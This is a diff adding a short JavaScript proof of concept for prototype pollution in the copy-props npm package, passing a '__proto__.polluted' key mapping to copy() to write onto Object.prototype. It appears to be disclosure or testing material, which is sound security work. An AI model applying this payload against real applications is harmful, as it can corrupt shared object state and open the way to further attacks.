@@ -1,0 +1,13 @@
+```javascript
+const copy = require("copy-props");
+
+console.log("before:", ({}).polluted); // undefined
+
+// copy-props's setDeep()/_setDeep() splits destination key chains on '.'
+// and blindly assigns obj[key] without filtering '__proto__', so a
+// crafted "fromto" mapping lets an attacker write directly onto
+// Object.prototype.
+copy({ a: "pwned" }, {}, { a: "__proto__.polluted" });
+
+console.log("after:", ({}).polluted); // "pwned"  <-- every object is now polluted
+```
